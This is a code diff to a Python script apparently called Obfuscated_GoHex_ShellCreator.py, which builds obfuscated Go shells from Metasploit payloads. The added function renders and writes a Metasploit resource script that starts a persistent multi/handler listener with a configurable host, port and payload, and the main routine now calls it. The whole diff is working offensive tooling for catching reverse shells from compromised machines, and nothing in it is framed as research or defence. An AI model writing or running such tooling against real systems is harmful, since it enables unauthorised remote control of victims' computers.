@@ -131,7 +131,26 @@ def Golang_Shell_Template():
 
 def Create_msfconsole_rcScript():
     """ https://metasploit.help.rapid7.com/docs/resource-scripts -- """
-    """ to do ;)"""
+    """ quick msf rc script -- """
+
+    rcScript = ("""
+    use exploit/multi/handler
+    set LHOST {{ lhost }} 
+    set LPORT {{ lport }}
+    set PAYLOAD {{ payload }}
+    set EXITFUNC thread
+    set ExitOnSession false
+    rexploit -j -z
+    """)
+
+    # write rcScript --
+    rcScript_out = Environment().from_string(rcScript).render(
+        lhost=args.LHOST, lport=args.LPORT, payload=args.PAYLOAD)
+
+    # write --
+    print("[+] Writing msfconsole rc: -> ./shell.rc")
+    with open('shell.rc', 'w') as rcfile:
+              rcfile.write(rcScript_out)
 
 
 def Golang_Compile_Shell():
@@ -184,5 +203,6 @@ if __name__ == '__main__':
     print("\n[+] Starting Obfuscated_GoHex_ShellCreator.py\n")
     msf_Payload = Generate_msf_Payload()
     Golang_Compile_Shell()
+    Create_msfconsole_rcScript()
 
 # __EOF__
